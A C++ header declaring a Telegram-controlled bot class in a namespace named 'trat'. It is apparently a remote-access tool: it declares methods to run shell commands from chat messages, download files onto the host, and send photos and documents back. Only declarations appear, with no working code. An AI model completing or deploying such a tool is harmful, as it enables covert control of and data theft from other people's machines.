#ifndef BOT_HPP
#define BOT_HPP

#include <telebot-types.h>
#include <telebot.h>
#include <cstdint>
#include <cstring>  // For strdup
#include "shell.hpp"

namespace trat {

class Shell;

class Bot
{
public:
    telebot_handler_t handle;  
    char* token;                 
    int64_t clientId;
    Shell shell;                          

    Bot(const char* Token, const int64_t& Client_Id); 
    ~Bot();                                          
    bool sendMessage(const char* Message);  
    bool sendPhoto(const char* File_Path);
    bool sendDocument(const char* Document_Path);

    void handleDownloadCommand(const char* Telegram_Message_Text);
    
    void handleTextBasedCommand(const char* Telegram_Message_Text, const char* Command,  char* Shell_Function_Callback_Result);
    void handleShellCommandWithoutResponse(const char* Telegram_Message_Text);	
	  void handleDocuments(telebot_document_t* P_Telebot_Document);
    void handlePhotos(telebot_photo_t* P_Telebot_Photo); 
    bool downloadFromChat(const char* File_Id, const char* File_Path);
    void listen();

};

}  // namespace trat

#endif  // BOT_HPP
